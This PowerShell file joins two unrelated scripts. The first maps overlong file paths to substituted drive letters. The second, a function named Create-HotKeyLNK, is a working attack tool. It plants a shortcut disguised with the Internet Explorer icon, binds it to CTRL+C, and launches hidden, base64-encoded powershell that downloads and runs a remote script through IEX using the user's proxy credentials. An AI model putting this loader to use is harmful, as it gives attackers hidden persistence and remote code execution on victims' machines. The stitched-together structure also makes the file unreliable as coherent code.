




$source = 'c:\temp\new'





$files = Get-Files $source -Recurse -Method AlphaFS 



$drives = [io.driveinfo]::getdrives() | % {$_.name[0]}
$alpha = [char[]](65..90)
$avail = (diff $drives $alpha).inputobject
$sourcedrive = $avail[0] + ':'
$destdrive = $avail[1] + ':' 

$result = foreach ($file in $files)
{
    
    
    
    
    subst $sourcedrive /d | Out-Null

    
    
    $path = $newfile = $null

    
    if ($file.fullpath.length -gt 240)
    {
        
        $path = Split-Path $file.fullpath

        
        $extra = $null
        if ($path.length -gt 240)
        {
            $extra = New-Object System.Collections.ArrayList
            $split = $path.Split('\')
            $stop = 2
            while ($path.length -gt 240)
            {
                $end = $split.count - $stop
                $path = [string]::Join('\', $split[0..$end])
                $stop++
            }
            $extra = [string]::Join('\', $split[($end + 1)..($end + $stop)])
        }

        
        subst $sourcedrive $path

        
        if ($extra)
        {
            $newfile = Join-Path (Join-Path $sourcedrive $extra) $file.filename
        }
        else
        {
            $newfile = Join-Path $sourcedrive $file.filename
        }
    }
    else
    {
        $newfile = $file.fullpath
    }

    [pscustomobject]@{
        FullPath = $file.fullpath
        NewFile = $newfile
        SourceDrive = $sourcedrive
        Path = $path
        ExtraSubs = $extra
    }

    
    subst $sourcedrive /d | Out-Null
}

$result







function Create-HotKeyLNK {

    [CmdletBinding(DefaultParameterSetName = 'None')]
    param(

    [Parameter(Mandatory=$True)]
        [String]
        $LNKName,

        [Parameter(Mandatory=$True)]
        [String]
        $PersistencePath = "TaskBar",

        [Parameter()]
        [String]
        $EXEPath = "$env:windir\System32\WindowsPowerShell\v1.0\powershell.exe",

        [Parameter()]
        $IconPath = "$env:programfiles\Internet Explorer\iexplore.exe",

        [Parameter()]
        [String]
        $HotKey = "CTRL+C",

        [Parameter(Mandatory=$True)]
        [String]
        $PayloadURI

    )

     
    $LNKName = "C:\Users\rvrsh3ll\Desktop\" + $LNKName + ".lnk"
    if ($PersistencePath -eq 'TaskBar') {
        $PersistencePath = "$env:APPDATA\Microsoft\Internet Explorer\Quick Launch\User Pinned\TaskBar"
    } elseif ($PersistencePath -eq 'ImplicitAppShortcuts'){
        $PersistencePath = "$env:APPDATA\Microsoft\Internet Explorer\Quick Launch\User Pinned\ImplicitAppShortcuts"
    } elseif ($PersistencePath -eq 'Start Menu') {
        $PersistencePath = "$env:APPDATA\Microsoft\Windows\Start Menu"
    } elseif ($PersistencePath -eq 'Desktop') {
        $PersistencePath = "$env:userprofile\Desktop"
    }

    $payload = "`$wc = New-Object System.Net.Webclient; `$wc.Headers.Add('User-Agent','Mozilla/5.0 (Windows NT 6.1; WOW64;Trident/7.0; AS; rv:11.0) Like Gecko'); `$wc.proxy= [System.Net.WebRequest]::DefaultWebProxy; `$wc.proxy.credentials = [System.Net.CredentialCache]::DefaultNetworkCredentials; IEX (`$wc.downloadstring('$PayloadURI'))"
    $encodedPayload = [System.Convert]::ToBase64String([System.Text.Encoding]::Unicode.GetBytes($payload))
    $finalPayload = "-nop -WindowStyle Hidden -enc $encodedPayload"
    $obj = New-Object -ComObject WScript.Shell
    $link = $obj.CreateShortcut($LNKName)
    $link.WindowStyle = '7'
    $link.TargetPath = $EXEPath
    $link.HotKey = $HotKey
    $link.IconLocation = $IconPath
    $link.Arguments = $finalPayload
    $link.Save()
}
